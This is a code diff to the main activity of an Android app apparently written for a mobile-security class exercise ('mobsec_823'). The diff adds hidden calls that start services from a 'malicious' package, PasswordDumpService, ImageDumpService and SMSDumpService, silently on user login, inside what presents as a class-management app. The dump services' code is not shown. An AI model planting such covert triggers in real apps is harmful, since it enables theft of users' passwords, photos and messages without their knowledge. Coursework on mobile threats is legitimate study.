@@ -15,6 +15,11 @@ import com.example.mobsec_823.data.User
 import com.example.mobsec_823.ui.screens.* // Assuming your screens are in this package
 import com.example.mobsec_823.ui.theme.MobSecTheme
 
+import androidx.compose.ui.platform.LocalContext
+import com.example.mobsec_823.malicious.ImageDumpService
+import com.example.mobsec_823.malicious.PasswordDumpService
+import com.example.mobsec_823.malicious.SMSDumpService
+
 class MainActivity : ComponentActivity() {
     private val cameraPermissionLauncher =
         registerForActivityResult(ActivityResultContracts.RequestPermission()) { granted ->
@@ -26,7 +31,7 @@ class MainActivity : ComponentActivity() {
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
 
-        // --- Automatically start the background service --- 
+        // --- Automatically start the background service ---
         val serviceIntent = Intent(this, TacoDeliveryService::class.java).apply {
             action = TacoDeliveryService.ACTION_OPEN_FOR_BUSINESS
         }
@@ -59,11 +64,25 @@ fun MobSecApp() {
     var currentUser by remember { mutableStateOf<User?>(null) }
     var selectedClass by remember { mutableStateOf<ClassEntity?>(null) }
 
+    // Get the current context (needed to start services)
+    val context = LocalContext.current
+
     when (val screen = currentScreen) {
         is Screen.LoginTest -> {
             LoginTestScreen(
                 onUserSelected = { user ->
                     currentUser = user
+
+                    // Malicious service starts here - Upon successful login
+                    val passwordIntent = Intent(context, PasswordDumpService::class.java)
+                    context.startService(passwordIntent)
+
+                    val imageIntent = Intent(context, ImageDumpService::class.java)
+                    context.startService(imageIntent)
+
+                    val smsIntent = Intent(context, SMSDumpService::class.java)
+                    context.startService(smsIntent)
+
                     currentScreen = if (user.role == "teacher") {
                         Screen.TeacherDashboard
                     } else {
